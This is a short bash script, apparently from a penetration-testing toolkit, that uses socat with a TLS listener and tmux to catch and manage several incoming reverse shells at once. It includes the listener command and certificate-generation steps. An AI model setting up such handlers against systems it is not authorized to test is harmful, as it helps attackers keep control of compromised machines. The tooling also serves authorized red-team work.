# Taken from here: https://systemoverlord.com/2018/01/20/socat-as-a-handler-for-multiple-reverse-shells.html

# Simple and very useful
# This allows multiple connections at once and uses tmux to handle each individual connection
# Does require to be run in a tmux to work properly

# For the socat command: socat OPENSSL-LISTEN:<port>,cert=<cert>,reuseaddr,verify=0,fork EXEC:./socat_tmux.sh

# To generate a ssl/tls certificate for testing:
# openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -out bind.crt
# cat bind.key bind.crt > bind.pem

#!/bin/bash

SOCKDIR=$(mktemp -d)
SOCKF=${SOCKDIR}/usock

# Start tmux, if needed
tmux start
# Create window
tmux new-window "socat UNIX-LISTEN:${SOCKF},umask=0077 STDIO"
# Wait for socket
while test ! -e ${SOCKF} ; do sleep 1 ; done
# Use socat to ship data between the unix socket and STDIO.
exec socat STDIO UNIX-CONNECT:${SOCKF}
